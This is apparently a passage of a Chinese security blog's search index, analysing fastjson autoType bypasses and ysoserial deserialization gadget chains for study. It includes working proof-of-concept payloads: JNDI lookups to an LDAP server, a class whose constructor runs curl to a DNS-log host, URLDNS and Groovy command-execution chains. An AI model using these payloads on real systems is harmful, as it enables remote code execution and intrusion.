","date":"2022-11-10","objectID":"/fastjson/:9:1","tags":null,"title":"fastjson分析","uri":"/fastjson/"},{"categories":["代码审计"],"content":"JndiConverter分析 //org.apache.xbean.propertyeditor.AbstractConverter public final void setAsText(String text) {//text为ldap地址 Object value = toObject(text.trim()); super.setValue(value); } public final Object toObject(String text) { if (text == null) { return null; } Object value = toObjectImpl(text.trim()); return value; } //org.apache.xbean.propertyeditor.JndiConverter public JndiConverter() { super(Context.class); } protected Object toObjectImpl(String text) { try { InitialContext context = new InitialContext(); return (Context) context.lookup(text);//text为ldap地址,lookup进行JNDI注入 } catch (NamingException e) { throw new PropertyEditorException(e); } } ","date":"2022-11-10","objectID":"/fastjson/:9:2","tags":null,"title":"fastjson分析","uri":"/fastjson/"},{"categories":["代码审计"],"content":"1.2.66 package learn.bypass; import com.alibaba.fastjson.JSON; import com.alibaba.fastjson.parser.ParserConfig; /* 与1.2.45的绕过类似,通过多个类进行绕过 */ public class bypass_1_2_66 { public static void main(String[] args) { ParserConfig.getGlobalInstance().setAutoTypeSupport(true); // String json_str = \"{\\\"@type\\\":\\\"org.apache.shiro.realm.jndi.JndiRealmFactory\\\", \\\"jndiNames\\\":[\\\"ldap://127.0.0.1:1389/exp\\\"], \\\"Realms\\\":[\\\"\\\"]}\"; // String json_str = \"{\\\"@type\\\":\\\"br.com.anteros.dbcp.AnterosDBCPConfig\\\",\\\"metricRegistry\\\":\\\"ldap://127.0.0.1:1389/exp\\\"}\"; // String json_str = \"{\\\"@type\\\":\\\"br.com.anteros.dbcp.AnterosDBCPConfig\\\",\\\"healthCheckRegistry\\\":\\\"ldap://127.0.0.1:1389/exp\\\"}\"; String json_str = \"{\\\"@type\\\":\\\"com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig\\\",\\\"properties\\\": {\\\"@type\\\":\\\"java.util.Properties\\\",\\\"UserTransaction\\\":\\\"ldap://127.0.0.1:1389/exp\\\"}}\"; JSON.parseObject(json_str); } } ","date":"2022-11-10","objectID":"/fastjson/:10:0","tags":null,"title":"fastjson分析","uri":"/fastjson/"},{"categories":["代码审计"],"content":"JndiRealmFactory分析 shiro-core 1.2.4 //org.apache.shiro.realm.jndi.JndiRealmFactory public void setJndiNames(Collection\u003cString\u003e jndiNames) {//jndiNames:[\"ldap://127.0.0.1:1389/exp\"] this.jndiNames = jndiNames; } public Collection\u003cRealm\u003e getRealms() throws IllegalStateException { Collection\u003cString\u003e jndiNames = getJndiNames(); ... List\u003cRealm\u003e realms = new ArrayList\u003cRealm\u003e(jndiNames.size()); for (String name : jndiNames) { try { Realm realm = (Realm) lookup(name, Realm.class);//lookup进行JNDI注入 realms.add(realm); } catch (Exception e) { throw new IllegalStateException(\"Unable to look up realm with jndi name '\" + name + \"'.\", e); } } return realms.isEmpty() ? null : realms; } 前面对com.alibaba.fastjson.util.JavaBeanInfo进行分析时,提到get方法能否加入fieldList中会进行如下判断 if (Collection.class.isAssignableFrom(method.getReturnType()) || Map.class.isAssignableFrom(method.getReturnType()) || AtomicBoolean.class == method.getReturnType() || AtomicInteger.class == method.getReturnType() || AtomicLong.class == method.getReturnType()) 显然getRealms满足判断条件 ","date":"2022-11-10","objectID":"/fastjson/:10:1","tags":null,"title":"fastjson分析","uri":"/fastjson/"},{"categories":["代码审计"],"content":"AnterosDBCPConfig分析 Anteros-DBCP 1.0.1, Anteros-Core 1.2.0 //br.com.anteros.dbcp.AnterosDBCPConfig public void setMetricRegistry(Object metricRegistry) { if (metricRegistry != null) { metricRegistry = getObjectOrPerformJndiLookup(metricRegistry);//jndi查询 ... } this.metricRegistry = metricRegistry; } public void setHealthCheckRegistry(Object healthCheckRegistry) { if (healthCheckRegistry != null) { healthCheckRegistry = getObjectOrPerformJndiLookup(healthCheckRegistry); ... } this.healthCheckRegistry = healthCheckRegistry; } private Object getObjectOrPerformJndiLookup(Object object) { if (object instanceof String) { try { InitialContext initCtx = new InitialContext(); return initCtx.lookup((String) object);//lookup进行JNDI注入 } catch (NamingException e) { throw new IllegalArgumentException(e); } } return object; } ","date":"2022-11-10","objectID":"/fastjson/:10:2","tags":null,"title":"fastjson分析","uri":"/fastjson/"},{"categories":["代码审计"],"content":"JtaTransactionConfig分析 ibatis-sqlmap 2.3.4.726 , jta 1.1 //com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig public void setProperties(Properties props) throws SQLException, TransactionException { String utxName = null; try { utxName = (String) props.get(\"UserTransaction\");//获取UserTransaction的值,即ldap地址 InitialContext initCtx = new InitialContext(); userTransaction = (UserTransaction) initCtx.lookup(utxName);//lookup进行JNDI注入 } catch (NamingException e) { throw new SqlMapException(\"Error initializing JtaTransactionConfig while looking up UserTransaction (\" + utxName + \"). Cause: \" + e); } } ","date":"2022-11-10","objectID":"/fastjson/:10:3","tags":null,"title":"fastjson分析","uri":"/fastjson/"},{"categories":["代码审计"],"content":"1.2.67 package learn.bypass; import com.alibaba.fastjson.JSON; import com.alibaba.fastjson.parser.ParserConfig; /* 与1.2.45的绕过类似,通过多个类进行绕过 */ public class bypass_1_2_67 { public static void main(String[] args) { ParserConfig.getGlobalInstance().setAutoTypeSupport(true); String json_str = \"{\\\"@type\\\":\\\"org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup\\\", \\\"jndiNames\\\":[\\\"ldap://127.0.0.1:1389/exp\\\"], \\\"tm\\\": {\\\"$ref\\\":\\\"$.tm\\\"}}\";// $.tm为路径引用,即调用getTm方法 // String json_str = \"{\\\"@type\\\":\\\"org.apache.shiro.jndi.JndiObjectFactory\\\",\\\"resourceName\\\":\\\"ldap://127.0.0.1:1389/exp\\\",\\\"instance\\\":{\\\"$ref\\\":\\\"$.instance\\\"}}\";// $.instance为路径引用,即调用getInstance方法 JSON.parseObject(json_str); } } ","date":"2022-11-10","objectID":"/fastjson/:11:0","tags":null,"title":"fastjson分析","uri":"/fastjson/"},{"categories":["代码审计"],"content":"CacheJndiTmLookup分析 ignite-core 2.10.0 , ignite-jta 2.10.0 public void setJndiNames(List\u003cString\u003e jndiNames) { this.jndiNames = jndiNames; } /** {@inheritDoc} */ @Nullable @Override public TransactionManager getTm() throws IgniteException { assert jndiNames != null; assert !jndiNames.isEmpty(); try { InitialContext ctx = new InitialContext(); for (String s : jndiNames) { Object obj = ctx.lookup(s);//lookup进行JNDI注入 if (obj != null \u0026\u0026 obj instanceof TransactionManager) return (TransactionManager) obj; } } return null; } ","date":"2022-11-10","objectID":"/fastjson/:11:1","tags":null,"title":"fastjson分析","uri":"/fastjson/"},{"categories":["代码审计"],"content":"JndiObjectFactory分析 //org.apache.shiro.jndi.JndiObjectFactory public T getInstance() { try { if(requiredType != null) { return requiredType.cast(this.lookup(resourceName, requiredType)); } else { return (T) this.lookup(resourceName);//lookup进行JNDI注入 } } catch (NamingException e) { final String typeName = requiredType != null ? requiredType.getName() : \"object\"; throw new IllegalStateException(\"Unable to look up \" + typeName + \" with jndi name '\" + resourceName + \"'.\", e); } } public void setResourceName(String resourceName) { this.resourceName = resourceName; } ","date":"2022-11-10","objectID":"/fastjson/:11:2","tags":null,"title":"fastjson分析","uri":"/fastjson/"},{"categories":["代码审计"],"content":"1.2.68 package learn.bypass; import com.alibaba.fastjson.JSON; public class bypass_1_2_68 { public static void main(String[] args) { //无需开启AutoTypeSupport String json_str = \"{\\\"@type\\\":\\\"java.lang.AutoCloseable\\\",\\\"@type\\\":\\\"learn.bypass.evil_1_2_68\\\"}\"; JSON.parseObject(json_str); } } package learn.bypass; import java.io.IOException; public class evil_1_2_68 implements AutoCloseable { public evil_1_2_68() { try { Runtime.getRuntime().exec(\"curl http://1.2.68.6bb37b09.dns.1433.eu.org\"); } catch (IOException e) { e.printStackTrace(); } } @Override public void close() throws Exception { } } ","date":"2022-11-10","objectID":"/fastjson/:12:0","tags":null,"title":"fastjson分析","uri":"/fastjson/"},{"categories":["代码审计"],"content":"第一次checkAutoType分析 public Class\u003c?\u003e checkAutoType(String typeName, Class\u003c?\u003e expectClass, int features) {//此时的expectClass为null if (typeName == null) { return null; } if (autoTypeCheckHandlers != null) { for (AutoTypeCheckHandler h : autoTypeCheckHandlers) { Class\u003c?\u003e type = h.handler(typeName, expectClass, features); if (type != null) { return type; } } } final int safeModeMask = Feature.SafeMode.mask; boolean safeMode = this.safeMode || (features \u0026 safeModeMask) != 0 || (JSON.DEFAULT_PARSER_FEATURE \u0026 safeModeMask) != 0; if (safeMode) { //开启safeMode后,无法进行AutoType操作 throw new JSONException(\"safeMode not support autoType : \" + typeName); } if (typeName.length() \u003e= 192 || typeName.length() \u003c 3) { throw new JSONException(\"autoType is not support. \" + typeName); } final boolean expectClassFlag; if (expectClass == null) { expectClassFlag = false; } else { if (expectClass == Object.class || ... ) { expectClassFlag = false; } else { expectClassFlag = true; } } String className = typeName.replace('$', '.'); Class\u003c?\u003e clazz; ... long fullHash = TypeUtils.fnv1a_64(className); boolean internalWhite = Arrays.binarySearch(INTERNAL_WHITELIST_HASHCODES, fullHash) \u003e= 0; //internalWhite为false,不在内部白名单的哈希中 ... if ((!internalWhite) \u0026\u0026 (autoTypeSupport || expectClassFlag)) { //expectClassFlag为false,由前面的if (expectClass == null) { expectClassFlag = false;决定 long hash = h3; for (int i = 3; i \u003c className.length(); ++i) { hash ^= className.charAt(i); hash *= PRIME; if (Arrays.binarySearch(acceptHashCodes, hash) \u003e= 0) { clazz = TypeUtils.loadClass(typeName, defaultClassLoader, true); if (clazz != null) { return clazz; } } if (Arrays.binarySearch(denyHashCodes, hash) \u003e= 0 \u0026\u0026 TypeUtils.getClassFromMapping(typeName) == null) { if (Arrays.binarySearch(acceptHashCodes, fullHash) \u003e= 0) { continue; } throw new JSONException(\"autoType is not support. \" + typeName); } } } clazz = TypeUtils.getClassFromMapping(typeName);//从缓存中加载类 if (clazz == null) { clazz = deserializers.findClass(typeName); } if (clazz == null) { clazz = typeMapping.get(typeName); } if (internalWhite) { clazz = TypeUtils.loadClass(typeName, defaultClassLoader, true); } if (clazz != null) {//判断clazz是不是继承了expectClass类且不是HashMap类型,是的话抛出异常,否则直接返回该类 if (expectClass != null \u0026\u0026 clazz != java.util.HashMap.class \u0026\u0026 !expectClass.isAssignableFrom(clazz)) { throw new JSONException(\"type not match. \" + typeName + \" -\u003e \" + expectClass.getName()); } return clazz; } } 使用JavaBeanDeserializer反序列化器进行反序列化操作 //com.alibaba.fastjson.parser.DefaultJSONParser ObjectDeserializer deserializer = config.getDeserializer(clazz); Class deserClass = deserializer.getClass(); if (JavaBeanDeserializer.class.isAssignableFrom(deserClass) \u0026\u0026 deserClass != JavaBeanDeserializer.class \u0026\u0026 deserClass != ThrowableDeserializer.class) { this.setResolveStatus(NONE); } else if (deserializer instanceof MapDeserializer) { this.setResolveStatus(NONE); } Object obj = deserializer.deserialze(this, clazz, fieldName); return obj; ","date":"2022-11-10","objectID":"/fastjson/:12:1","tags":null,"title":"fastjson分析","uri":"/fastjson/"},{"categories":["代码审计"],"content":"JavaBeanDeserializer反序列化器 //com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer ObjectDeserializer deserializer = getSeeAlso(config, this.beanInfo, typeName); Class\u003c?\u003e userType = null; if (deserializer == null) {//deserializer为null,此时进行第二次checkAutoType Class\u003c?\u003e expectClass = TypeUtils.getClass(type); userType = config.checkAutoType(typeName, expectClass, lexer.getFeatures());//typename为learn.bypass.evil_1_2_68,而expectClass为interface java.lang.AutoCloseable deserializer = parser.getConfig().getDeserializer(userType); } ","date":"2022-11-10","objectID":"/fastjson/:12:2","tags":null,"title":"fastjson分析","uri":"/fastjson/"},{"categories":["代码审计"],"content":"第二次checkAutoType分析 public Class\u003c?\u003e checkAutoType(String typeName, Class\u003c?\u003e expectClass, int features) { if (typeName == null) { return null; } if (autoTypeCheckHandlers != null) { for (AutoTypeCheckHandler h : autoTypeCheckHandlers) { Class\u003c?\u003e type = h.handler(typeName, expectClass, features); if (type != null) { return type; } } } final int safeModeMask = Feature.SafeMode.mask; boolean safeMode = this.safeMode || (features \u0026 safeModeMask) != 0 || (JSON.DEFAULT_PARSER_FEATURE \u0026 safeModeMask) != 0; if (safeMode) { throw new JSONException(\"safeMode not support autoType : \" + typeName); } if (typeName.length() \u003e= 192 || typeName.length() \u003c 3) { throw new JSONException(\"autoType is not support. \" + typeName); } final boolean expectClassFlag; if (expectClass == null) { expectClassFlag = false; } else { if (expectClass == Object.class || expectClass == Serializable.class ...) { expectClassFlag = false; } else { expectClassFlag = true; //java.lang.AutoCloseable类不是上述类的对象,因此expectClassFlag设置为true } } String className = typeName.replace('$', '.'); Class\u003c?\u003e clazz; ... long fullHash = TypeUtils.fnv1a_64(className); boolean internalWhite = Arrays.binarySearch(INTERNAL_WHITELIST_HASHCODES, fullHash) \u003e= 0; if (internalDenyHashCodes != null) { long hash = h3; for (int i = 3; i \u003c className.length(); ++i) { hash ^= className.charAt(i); hash *= PRIME; if (Arrays.binarySearch(internalDenyHashCodes, hash) \u003e= 0) { throw new JSONException(\"autoType is not support. \" + typeName); } } } if ((!internalWhite) \u0026\u0026 (autoTypeSupport || expectClassFlag)) { //由于expectClassFlag被设置为true,因此进入黑名单检验环节,显然learn.bypass.evil_1_2_68不属于黑名单,因此通过检验 long hash = h3; for (int i = 3; i \u003c className.length(); ++i) { hash ^= className.charAt(i); hash *= PRIME; if (Arrays.binarySearch(acceptHashCodes, hash) \u003e= 0) { clazz = TypeUtils.loadClass(typeName, defaultClassLoader, true); if (clazz != null) { return clazz; } } if (Arrays.binarySearch(denyHashCodes, hash) \u003e= 0 \u0026\u0026 TypeUtils.getClassFromMapping(typeName) == null) { if (Arrays.binarySearch(acceptHashCodes, fullHash) \u003e= 0) { continue; } throw new JSONException(\"autoType is not support. \" + typeName); } } } clazz = TypeUtils.getClassFromMapping(typeName); if (clazz == null) { clazz = deserializers.findClass(typeName); } if (clazz == null) { clazz = typeMapping.get(typeName); } if (internalWhite) { clazz = TypeUtils.loadClass(typeName, defaultClassLoader, true); } if (clazz != null) { if (expectClass != null \u0026\u0026 clazz != java.util.HashMap.class \u0026\u0026 !expectClass.isAssignableFrom(clazz)) { throw new JSONException(\"type not match. \" + typeName + \" -\u003e \" + expectClass.getName()); } return clazz; } if (!autoTypeSupport) {//autoTypeSupport为false,因此继续进行检测 ... } boolean jsonType = false; InputStream is = null; try { String resource = typeName.replace('.', '/') + \".class\"; if (defaultClassLoader != null) { is = defaultClassLoader.getResourceAsStream(resource); } else { is = ParserConfig.class.getClassLoader().getResourceAsStream(resource); } if (is != null) { ClassReader classReader = new ClassReader(is, true); TypeCollector visitor = new TypeCollector(\"\u003cclinit\u003e\", new Class[0]); classReader.accept(visitor); jsonType = visitor.hasJsonType(); } } catch (Exception e) { // skip } finally { IOUtils.close(is); } final int mask = Feature.SupportAutoType.mask; boolean autoTypeSupport = this.autoTypeSupport || (features \u0026 mask) != 0 || (JSON.DEFAULT_PARSER_FEATURE \u0026 mask) != 0; if (autoTypeSupport || jsonType || expectClassFlag) {//expectClassFlag为true,因此进行loadClass操作 boolean cacheClass = autoTypeSupport || jsonType; clazz = TypeUtils.loadClass(typeName, defaultClassLoader, cacheClass); } if (clazz != null) { if (jsonType) { //jsonType为false,因此没有直接添加到缓存map中 TypeUtils.addMapping(typeName, clazz); return clazz; } if (ClassLoader.class.isAssignableFrom(clazz) // classloader is danger || javax.sql.DataSource.class.isAssignableFrom(clazz) // dataSource can load jdbc driver || javax.sql.RowSet.class.isAssignableFrom(clazz) // ) { //检测是否为ClassLoader,DataSou","date":"2022-11-10","objectID":"/fastjson/:12:3","tags":null,"title":"fastjson分析","uri":"/fastjson/"},{"categories":["代码审计"],"content":"1.2.80 对groovy的利用理解有点问题,过几天再写 ","date":"2022-11-10","objectID":"/fastjson/:13:0","tags":null,"title":"fastjson分析","uri":"/fastjson/"},{"categories":["代码审计"],"content":"URLDNS分析 public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception { Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); } public static void poc() throws Exception { String url = \"http://76c61980.dns.1433.eu.org\"; HashMap hashMap = new HashMap(); URL u = new URL(url); setFieldValue(u, \"hashCode\", 1); hashMap.put(u, \"\"); setFieldValue(u, \"hashCode\", -1); Path path = Paths.get(\"/tmp/URLDNS.ser\"); ObjectOutputStream out = new ObjectOutputStream(Files.newOutputStream(path)); out.writeObject(hashMap); ObjectInputStream in = new ObjectInputStream(Files.newInputStream(path)); in.readObject();// 模拟反序列化 } HashMap#readObject在插入数据时会调用URL#hashCode方法,而URL#hashCode方法首先对hashCode进行判断,如果等于-1则进行handler.hashCode即DNS查询 /*HashMap#readObject*/ private void readObject(java.io.ObjectInputStream s) throws IOException, ClassNotFoundException { // Read the keys and values, and put the mappings in the HashMap for (int i = 0; i \u003c mappings; i++) { K key = (K) s.readObject(); V value = (V) s.readObject(); putVal(hash(key), key, value, false, false); } } static final int hash(Object key) { int h; return (key == null) ? 0 : (h = key.hashCode()) ^ (h \u003e\u003e\u003e 16); } /*URL#hashCode*/ public synchronized int hashCode() { if (hashCode != -1) return hashCode; hashCode = handler.hashCode(this);//URLStreamHandler return hashCode; } protected int hashCode(URL u) {//URLStreamHandler#hashCode int h = 0; String protocol = u.getProtocol(); if (protocol != null) h += protocol.hashCode(); InetAddress addr = getHostAddress(u);//执行DNS查询 } 因此在new URL(url)创建对象后,先通过反射将URL.hashCode设置为其他数值,避免在HashMap#putVal时进行DNS查询,在putVal后,重新将URL.hashCode设置为-1,在反序列化时能够正常进行DNS查询 ","date":"2022-10-10","objectID":"/ysoserial/:1:0","tags":null,"title":"ysoserial反序列化链分析","uri":"/ysoserial/"},{"categories":["代码审计"],"content":"动态代理 package learn.DynamicProxy; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Method; import java.lang.reflect.Proxy; public class DynamicProxy { public static void main(String[] args) { Instance ins = new Instance(); inter proxyInstance = (inter) Proxy.newProxyInstance(inter.class.getClassLoader(), new Class[] { inter.class }, new InvocationHandler() { /** * newProxyInstance(ClassLoader loader,Class\u003c?\u003e[] interfaces,InvocationHandler h) * CLassLoader loader 指定动态代理类的类加载器 * Class\u003c?\u003e interfaces 指定动态代理类需要实现的所有接口 * InvocationHandler h 处理调用方法的InvocationHandler对象 */ @Override public Object invoke(Object proxy, Method method, Object[] args) throws Throwable { /** * 所有的流程控制都在invoke方法中 * proxy 代理类 * method 正在调用的方法 * args 被调用方法的参数列表 */ if (method.getName().equals(\"func1\")) { System.out.println(\"proxy-func1\"); } else if (method.getName().equals(\"func2\")) { System.out.println(\"proxy-func2\"); } return null; } }); ins.func1(); ins.func2(); proxyInstance.func1(); proxyInstance.func2(); } } interface inter { void func1(); void func2(); } class Instance implements inter { @Override public void func1() { System.out.println(\"ins-func1\"); } @Override public void func2() { System.out.println(\"ins-func2\"); } } ","date":"2022-10-10","objectID":"/ysoserial/:2:0","tags":null,"title":"ysoserial反序列化链分析","uri":"/ysoserial/"},{"categories":["代码审计"],"content":"Groovy1分析 public class Groovy1 { public static void main(String[] args) { MethodClosure methodClosure = new MethodClosure(\"touch /tmp/Groovy1\", \"execute\");// 生成了一个MethodClosure对象，传入command和\"execute\" final ConvertedClosure closure = new ConvertedClosure(methodClosure, \"entrySet\");// 调用org.codehaus.groovy.runtime#ConvertedClosure并将methodName设置为\"entrySet\" Class\u003c?\u003e[] interfaces = (Class\u003c?\u003e[]) Array.newInstance(Class.class, 1); interfaces[0] = Map.class;// 将动态代理要实现的接口设置为Map Object o = Proxy.newProxyInstance(Groovy1.class.getClassLoader(), interfaces, closure);// 创建动态代理,invoke方法为ConvertedClosure#invoke final Map map = Map.class.cast(o);// 将代理对象转换为一个Map对象 map.entrySet().iterator();// 调用了entrySet方法,实际进入了代理对象的invoke方法,ConvertedClosure#Invoke } } ","date":"2022-10-10","objectID":"/ysoserial/:3:0","tags":null,"title":"ysoserial反序列化链分析","uri":"/ysoserial/"},{"categories":["代码审计"],"content":"分析invoke方法 map.entrySet().iterator()调用了entrySet方法,实际进入了代理对象的invoke方法,即ConvertedClosure#Invoke final ConvertedClosure closure = new ConvertedClosure(methodClosure, \"entrySet\"); //org.codehaus.groovy.runtime public class ConvertedClosure extends ConversionHandler implements Serializable { public ConvertedClosure(Closure closure, String method) { super(closure);// 将closure保存为this.delegate this.methodName = method;// methodName为entrySet } public Object invokeCustom(Object proxy, Method method, Object[] args) throws Throwable { if (methodName!=null \u0026\u0026 !methodName.equals(method.getName())) return null; return ((Closure) getDelegate()).call(args);//调用this.delegate.call(args),即(Closure) MethodClosure.call } } //org.codehaus.groovy.runtime public abstract class ConversionHandler implements InvocationHandler, Serializable { public ConversionHandler(Object delegate) { this.delegate = delegate; } public abstract Object invokeCustom(Object proxy, Method method, Object[] args) throws Throwable; public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {// 动态代理 ... if (!checkMethod(method)) {// 检查该方法是否是java.lang.Object的核心方法,当前method为java.util.Map#entrySet,check返回false,因此进入invokeCustom try { return invokeCustom(proxy, method, args);// 进入ConvertedClosure的invokeCustom方法 } } } } ","date":"2022-10-10","objectID":"/ysoserial/:3:1","tags":null,"title":"ysoserial反序列化链分析","uri":"/ysoserial/"},{"categories":["代码审计"],"content":"分析call方法 //groovy.lang public abstract class Closure\u003cV\u003e extends GroovyObjectSupport implements Cloneable, Runnable, GroovyCallable\u003cV\u003e, Serializable { public V call(Object... args) { try { return (V) getMetaClass().invokeMethod(this,\"doCall\",args); //getMetaClass()返回MetaClass的值,为MetaClassImpl //进入MetaClassImpl#invokeMethod //this 为 MethodClosure } } } //groovy.lang public class MetaClassImpl implements MetaClass, MutableMetaClass { public Object invokeMethod(Object object, String methodName, Object[] originalArguments) { return invokeMethod(theClass, object, methodName, originalArguments, false, false); } public Object invokeMethod(Class sender, Object object, String methodName, Object[] originalArguments, boolean isCallToSuper, boolean fromInsideClass) { /* * sender = theClass (MethodClosure) * object = MethidClosure{method: \"execute\",owner: \"touch /tmp/Groovy1\"} * methodName = docall */ MetaMethod method = null; if (method==null) { method = getMethodWithCaching(sender, methodName, arguments, isCallToSuper); } final boolean isClosure = object instanceof Closure;// MethidClosure是否为Closure的子类 if (isClosure) { final Closure closure = (Closure) object; final Object owner = closure.getOwner();// touch /tmp/Groovy1 if (CLOSURE_CALL_METHOD.equals(methodName) || CLOSURE_DO_CALL_METHOD.equals(methodName)) {// methodName = docall = CLOSURE_DO_CALL_METHOD final Class objectClass = object.getClass(); // objectClass = MethodClosure if (objectClass == MethodClosure.class) { final MethodClosure mc = (MethodClosure) object; methodName = mc.getMethod(); // MethodClosure.getMethod() = \"execute\" final Class ownerClass = owner instanceof Class ? (Class) owner : owner.getClass(); final MetaClass ownerMetaClass = registry.getMetaClass(ownerClass); return ownerMetaClass.invokeMethod(ownerClass, owner, methodName, arguments, false, false); /* * ownerMetaClass为MetaClassImpl,因此进行递归调用,直到object instanceof Closure不满足 * object为上一次传入的owner实参,因此在下一次调用时,owner为字符串\"touch /tmp/Groovy1\",显然不满足instanceof条件,因此跳出if语句 */ } ... } } if (method != null) { return method.doMethodInvoke(object, arguments); } else { return invokePropertyOrMissing(object, methodName, originalArguments, fromInsideClass, isCallToSuper); } } } ","date":"2022-10-10","objectID":"/ysoserial/:3:2","tags":null,"title":"ysoserial反序列化链分析","uri":"/ysoserial/"},{"categories":["代码审计"],"content":"分析doMethodInvoke方法 进入dgm$748#doMethodInvoke,该方法会调用ProcessGroovyMethods.execute即runtime.exec达到执行命令的目的 public class dgm$748 extends GeneratedMetaMethod { public final Object doMethodInvoke(Object var1, Object[] var2) { this.coerceArgumentsToClasses(var2); return ProcessGroovyMethods.execute((String)var1); } } public class ProcessGroovyMethods extends DefaultGroovyMethodsSupport { public static Process execute(final String self) throws IOException { return Runtime.getRuntime().exec(self); } } ","date":"2022-10-10","objectID":"/ysoserial/:3:3","tags":null,"title":"ysoserial反序列化链分析","uri":"/ysoserial/"},{"categories":["代码审计"],"content":"利用TemplatesImpl加载字节码 参考链接 TemplatesImpl利用链学习 ","date":"2022-10-10","objectID":"/ysoserial/:4:0","tags":null,"title":"ysoserial反序列化链分析","uri":"/ysoserial/"},{"categories":["代码审计"],"content":"分析 默认的defineClass是java.lang.ClassLoader的函数,而且是protected属性,无法直接调用 TemplatesImpl类中有一个内部类TransletClassLoader重写了defineClass,且其定义域为default static final class TransletClassLoader extends ClassLoader { ... Class defineClass(final byte[] b) { return defineClass(null, b, 0, b.length); } } 对defineClass查找用法,发现其仅在defineTransletClasses中被使用 com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl private void defineTransletClasses() throws TransformerConfigurationException { ... TransletClassLoader loader = (TransletClassLoader) AccessController.doPrivileged(new PrivilegedAction() { public Object run() { return new TransletClassLoader(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap()); //_tfactory : A reference to the transformer factory that this templates object belongs to. 因此 _tfactory 指向 TransformerFactoryImpl 的实例 } }); try { final int classCount = _bytecodes.length; _class = new Class[classCount]; if (classCount \u003e 1) { _auxClasses = new HashMap\u003c\u003e(); } for (int i = 0; i \u003c classCount; i++) { _class[i] = loader.defineClass(_bytecodes[i]);//_bytecodes为字节码数组 final Class superClass = _class[i].getSuperclass(); ... } ... } ... } 查找defineTransletClasses引用,共有三条直接利用链 private synchronized Class[] getTransletClasses() TemplatesImpl中已经没有调用getTransletClasses()的方法 public synchronized int getTransletIndex() public synchronized int getTransletIndex() { try { if (_class == null) defineTransletClasses(); } return _transletIndex; } 成功执行defineClass但没有输出,因为在defineClass被调用的时候,类对象是不会被初始化的(相当于只是将字节码转换成Java类,没有进行实例化操作) 需要通过newInstance()等方法调用构造函数 private Translet getTransletInstance() getTransletInstance被newTransformer调用,通过newTransformer构造调用链,并通过_class[_transletIndex].newInstance()调用构造函数,执行恶意代码 private Translet getTransletInstance() throws TransformerConfigurationException { try { if (_name == null) return null;//_name 不能为 null if (_class == null) defineTransletClasses();//调用defineclass // The translet needs to keep a reference to all its auxiliary // class to prevent the GC from collecting them AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();//调用构造函数 translet.postInitialization(); translet.setTemplates(this); translet.setServicesMechnism(_useServicesMechanism); translet.setAllowedProtocols(_accessExternalStylesheet); if (_auxClasses != null) { translet.setAuxiliaryClasses(_auxClasses); } return translet; } ... } public synchronized Transformer newTransformer() throws TransformerConfigurationException { TransformerImpl transformer; transformer = new TransformerImpl(getTransletInstance(), _outputProperties, _indentNumber, _tfactory); if (_uriResolver != null) { transformer.setURIResolver(_uriResolver); } if (_tfactory.getFeature(XMLConstants.FEATURE_SECURE_PROCESSING)) { transformer.setSecureProcessing(true); } return transformer; } ","date":"2022-10-10","objectID":"/ysoserial/:4:1","tags":null,"title":"ysoserial反序列化链分析","uri":"/ysoserial/"},{"categories":["代码审计"],"content":"通过javassist生成字节码 package learn.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.DOM; import com.sun.org.apache.xalan.internal.xsltc.TransletException; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator; import com.sun.org.apache.xml.internal.serializer.SerializationHandler; import javassist.*; import java.io.IOException; import java.util.Base64; public class GenerateClass { public static class AbstractTransletExt extends AbstractTranslet { @Override public void transform(DOM document, SerializationHandler[] handlers) throws TransletException { } @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException { } public AbstractTransletExt() { super(); System.out.println(\"AbstractTransletExt\"); } } public static void main(String[] args) throws CannotCompileException, IOException, NotFoundException { ClassPool pool = ClassPool.getDefault(); pool.insertClassPath(new ClassClassPath(AbstractTransletExt.class)); CtClass clazz = pool.get(AbstractTransletExt.class.getName()); System.out.println(new String(Base64.getEncoder().encode(clazz.toBytecode()))); } } ","date":"2022-10-10","objectID":"/ysoserial/:4:2","tags":null,"title":"ysoserial反序列化链分析","uri":"/ysoserial/"},{"categories":["代码审计"],"content":"通过newTransformer加载字节码并进行实例化 package learn.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Field; import java.util.Base64; public class TemplatesImplDemo { public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception { Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); } public static void getTransletIndex(TemplatesImpl obj, byte[] code) throws Exception { setFieldValue(obj, \"_bytecodes\", new byte[][]{code}); setFieldValue(obj, \"_tfactory\", new TransformerFactoryImpl()); obj.getTransletIndex(); } public static void newTransformer(TemplatesImpl obj, byte[] code) throws Exception { setFieldValue(obj, \"_bytecodes\", new byte[][]{code}); setFieldValue(obj, \"_name\", \"asdf\"); setFieldValue(obj, \"_tfactory\", new TransformerFactoryImpl()); obj.newTransformer(); } public static void main(String[] args) throws Exception { byte[] code = Base64.getDecoder().decode(\"yv66vgAAA...wAJ\"); TemplatesImpl obj = new TemplatesImpl(); // getTransletIndex(obj, code); newTransformer(obj, code); } } ","date":"2022-10-10","objectID":"/ysoserial/:4:3","tags":null,"title":"ysoserial反序列化链分析","uri":"/ysoserial/"},{"categories":["代码审计"],"content":"CommonsBeanutils1分析 利用链如下 package learn.CommonsBeanutils1; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.nio.file.Files; import java.nio.file.Path; import java.nio.file.Paths; import java.util.PriorityQueue; import com.sun.org.apache.xalan.internal.xsltc.DOM; import com.sun.org.apache.xalan.internal.xsltc.TransletException; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import 